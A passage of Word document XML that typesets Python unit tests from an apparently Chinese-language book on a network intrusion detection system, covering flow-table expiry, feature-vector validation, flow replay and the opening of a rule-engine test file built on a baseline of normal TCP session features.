    </w:p>
    <w:p w14:paraId="03134F6C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """"实时快照"和"流结束收尾"是两件事，快照若顺手删流，告警就永远等不到流结束。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A1137B4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    table = FlowTable()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E535BCC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    table.add(pkt(7000.0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4342C5CD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    table.snapshot(7001.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29DDD1A4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert len(table.flows) == 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F85BD4D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert len(table.expire(7002.0)) == 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FB9FC41">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="661A8CD7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7570390E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_to_vector_rejects_missing_column():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="204EE379">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    from collections import OrderedDict</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58F739B3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="65D210A9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    feats = OrderedDict((name, 0.0) for name in FEATURE_ORDER)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F45BDF7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert len(to_vector(feats)) == 78</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D2EF553">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    del feats["Flow Duration"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49B35CDA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    with pytest.raises(KeyError):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AF6FDE9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        to_vector(feats)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09D772A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6C9EEAD0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49CD7871">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_replay_returns_all_flows():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B1991C6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    records = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30357BFB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        pkt(8000.0, src=("10.0.0.1", 1111), flags=FIN | ACK),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74A285F7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        pkt(8001.0, src=("10.0.0.1", 2222), flags=FIN | ACK),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ED86306">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61F48538">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    flows = replay(records)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FF9F184">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert len(flows) == 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49083BA5">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="41B50881">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-30　tests/test_rules.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（150 行）　规则引擎测试</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19CBCAA7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""M11 规则引擎自测：单流规则、窗口规则、去重与内存上限。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0303F0DB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C322B59">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>这些断言都刻意配一组"刚好不够阈值"的对照，否则只测"能报"会漏掉阈值写反的情况。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B8F5E73">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>基准流是一条约 0.3 秒、双向都有包的正常 TCP 会话，各用例只覆盖自己关心的字段。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13855CCE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7211619E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="141A5BD4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from probe.features import FEATURE_ORDER</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A719827">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5348249F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from center.rules import RuleEngine, flow_rules, pick</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29F1784F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="700FD67F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># 正常会话基准：时长 0.3 s、4 前向 / 3 后向包、带 SYN 与 ACK</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C645159">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>BASE = {name: 0.0 for name in FEATURE_ORDER}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CE2DAB9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>BASE.update({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10AE6B40">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Flow Duration": 300_000.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F16D0D2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Total Fwd Packets": 4.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CCB7BDB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Total Backward Packets": 3.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50A605C0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "SYN Flag Count": 1.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="620D2F04">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "ACK Flag Count": 2.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="449505E3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Flow Packets/s": 23.3,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3326BD00">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0952B394">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F81DCD8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1AB9A32A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def feats(**kw) -&gt; dict:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="511BC2A1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    f = dict(BASE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2690A949">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    f.update(kw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3611B14A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return f</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0866EBD4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="16076745">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="382EE024">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def key(src="10.0.0.1", sport=40000, dst="10.0.0.2", dport=80, proto=6) -&gt; str:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75C5364C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return f"{proto}|{src}|{sport}|{dst}|{dport}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71FAEFBF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3FA5B83D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76113DA0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># ---------------------------------------------------------------- 单流规则</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="782FE17C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="599B8404">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2642C406">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_normal_web_flow_triggers_nothing():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05D54A57">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert flow_rules(feats()) == []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F8B2ED6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03E255B1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2A38C9D4">
      <w:pPr>
        <w:widowControl w:val="0"/>
